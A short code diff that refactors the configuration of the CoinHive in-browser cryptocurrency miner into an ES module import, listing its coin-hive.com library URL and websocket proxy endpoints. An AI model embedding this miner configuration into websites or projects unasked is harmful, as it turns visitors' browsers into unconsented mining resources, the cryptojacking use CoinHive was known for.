@@ -1,5 +1,7 @@
-self.CoinHive = self.CoinHive || {};
-self.CoinHive.CONFIG = {
+import {CoinHive, URL, WebAssembly} from './coinhive.js';
+
+CoinHive = CoinHive || {};
+CoinHive.CONFIG = {
   LIB_URL: "https://coin-hive.com/lib/",
   WEBSOCKET_SHARDS: [
     ["wss://ws001.coin-hive.com/proxy", "wss://ws002.coin-hive.com/proxy", "wss://ws003.coin-hive.com/proxy", "wss://ws004.coin-hive.com/proxy", "wss://ws005.coin-hive.com/proxy", "wss://ws006.coin-hive.com/proxy", "wss://ws007.coin-hive.com/proxy"],
